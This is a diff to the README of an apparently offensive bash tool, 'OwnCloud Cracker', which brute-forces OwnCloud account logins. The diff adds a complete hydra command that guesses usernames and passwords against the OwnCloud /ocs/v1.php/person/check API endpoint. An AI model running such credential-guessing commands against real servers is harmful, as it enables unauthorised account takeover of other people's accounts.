@@ -1,7 +1,10 @@
 =====
 OwnCloud Cracker
 
-Bruteforce OwnCloud accounts using it's API.
+Bruteforce OwnCloud accounts using it's API. Yes, in bash!
+
+You can also use hydra if available:
+hydra 127.0.0.1 -L userlist.txt -P pass.txt "/ocs/v1.php/person/check:login=^USER^&password=^PASS^"
 
 Get help with the "-h" switch: ./ocrk.sh -h
 
